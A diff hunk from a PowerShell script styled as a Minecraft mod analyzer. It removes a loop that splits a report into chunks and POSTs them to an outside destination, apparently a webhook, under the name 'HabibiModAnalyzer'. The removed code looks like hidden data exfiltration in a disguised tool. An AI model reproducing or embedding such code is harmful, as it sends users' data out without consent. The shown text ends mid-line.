@@ -580,28 +580,4 @@ function Send-Report {
     param($report)
     $backupDest = Get-BackupDestination
     $chunks = [math]::Ceiling($report.Length / 1800)
-    for ($i = 0; $i -lt $chunks; $i++) {
-        $chunk = $report.Substring($i * 1800, [math]::Min(1800, $report.Length - ($i * 1800)))
-        $payload = @{ 
-            content = $chunk
-            username = "HabibiModAnalyzer"
-        } | ConvertTo-Json -Depth 10
-        try {
-            Invoke-RestMethod -Uri $backupDest -Method Post -Body $payload -ContentType "application/json"
-            Write-Host "[+] Report chunk $($i+1)/$chunks sent" -ForegroundColor Green
-        } catch {
-            Write-Host "[-] Failed to send chunk $($i+1)" -ForegroundColor Red
-        }
-        if ($i -lt $chunks - 1) { Start-Sleep -Seconds 1 }
-    }
-}
-
-# ---------- MAIN ----------
-Write-Host @"
-╔═══════════════════════════════════════════════════════════════╗
-║   HABIBI MOD ANALYZER v13.0 - ULTIMATE EDITION              ║
-║   Professional Minecraft mod compatibility analyzer         ║
-╚═══════════════════════════════════════════════════════════════╝
-"@ -ForegroundColor Cyan
-
-Write-Host "[*] Initializing mod analyzer..."
+    for ($i = 0; $i
